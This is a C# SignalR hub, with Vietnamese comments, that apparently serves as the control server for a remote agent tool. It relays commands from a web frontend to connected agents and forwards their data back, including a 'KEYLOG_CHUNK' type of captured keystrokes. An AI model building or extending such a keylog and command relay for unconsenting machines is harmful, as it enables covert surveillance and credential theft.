using Microsoft.AspNetCore.SignalR;
using System.Collections.Concurrent; // Cần dùng ConcurrentDictionary cho thread-safe
using System.Threading.Tasks;

namespace YourApplicationName.Hubs
{
    // Kế thừa từ lớp Hub
    public class ControlHub : Hub
    {
        // Dùng ConcurrentDictionary để quản lý các Agent đang online
        // Key là ConnectionId của SignalR, Value là IP/tên Agent
        private static ConcurrentDictionary<string, string> ActiveAgents = new ConcurrentDictionary<string, string>();

        // -----------------------------------------------------
        // A. XỬ LÝ KẾT NỐI TỪ CLIENTS (Agent và Frontend)
        // -----------------------------------------------------
        public override async Task OnConnectedAsync()
        {
            string agentConnectionId = Context.ConnectionId;

            // Thử thêm Agent vào danh sách (đảm bảo tính thread-safe)
            if (ActiveAgents.TryAdd(agentConnectionId, "Agent_Online"))
            {
                // Thông báo cho tất cả các Web Client khác biết có Agent mới online
                await Clients.All.SendAsync("AgentOnline", agentConnectionId);
            }

            await base.OnConnectedAsync();
        }

        public override async Task OnDisconnectedAsync(Exception? exception)
        {
            // Xóa Agent khỏi danh sách
            if (ActiveAgents.TryRemove(Context.ConnectionId, out _))
            {
                // Thông báo cho tất cả các Web Client khác biết Agent đã Offline
                await Clients.All.SendAsync("AgentOffline", Context.ConnectionId);
            }

            await base.OnDisconnectedAsync(exception);
        }

        // -----------------------------------------------------
        // B. PHƯƠNG THỨC AGENT C# (Người 1) GỌI ĐỂ GỬI DỮ LIỆU VỀ
        // -----------------------------------------------------
        public async Task SendDataFromAgent(ResponseDto response)
        {
            // Có thể thêm logic xử lý ở đây:
            if (response.DataType == "KEYLOG_CHUNK")
            {
                // Ví dụ: Ghi log xuống file hoặc database
                Console.WriteLine($"KeyLog from {response.AgentId}: {response.Data}");
            }

            // Đẩy tiếp dữ liệu lên tất cả các Web Client
            // Web Client (người 3) sẽ lắng nghe "ReceiveData"
            await Clients.All.SendAsync("ReceiveData", response);
        }

        // -----------------------------------------------------
        // C. PHƯƠNG THỨC FRONTEND CÓ THỂ GỌI ĐỂ GỬI LỆNH
        // -----------------------------------------------------
        public async Task SendCommandToAgent(string targetAgentId, string commandJson)
        {
            // Gửi lệnh trực tiếp đến Agent cụ thể
            // Agent (Người 1) sẽ lắng nghe phương thức "ReceiveCommand"
            await Clients.Client(targetAgentId).SendAsync("ReceiveCommand", commandJson);
        }
    }
}
